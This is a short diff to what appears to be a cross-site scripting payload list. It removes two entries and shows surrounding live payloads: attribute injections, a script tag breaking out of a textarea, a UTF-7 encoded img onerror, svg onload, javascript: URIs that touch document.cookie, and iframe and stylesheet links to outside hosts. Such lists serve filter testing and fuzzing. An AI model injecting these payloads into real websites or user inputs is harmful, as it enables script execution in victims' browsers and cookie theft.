@@ -2599,7 +2599,6 @@
 'onmouseover='alert(1)'a='
 ):<!--[if IE 8]><p>Welcome to Internet Explorer 8.</p><![endif]-->
 */%22%3E%3C/textarea%3E%3Cscript%3Ealert(&title=1%22);%3C/script%3E
-+((+!![]+[])+(!+[]+!![])+(!+[]+!![]+!![]+[]))
 +49/>"<iframe src=http://vulnerability-lab.com>1337
 +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
 --!><svg onload=prompt(1)
@@ -3110,7 +3109,6 @@
 <INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
 <INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
 <L:µ onclick=alert(1)>click me</L:µ>
-<LAYER SRC="%(scriptlet)s"></LAYER>
 <LAYER SRC="javascript:alert(1);"></LAYER>
 <LAYER SRC="javascript:document.cookie=true;"></LAYER>
 <LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">
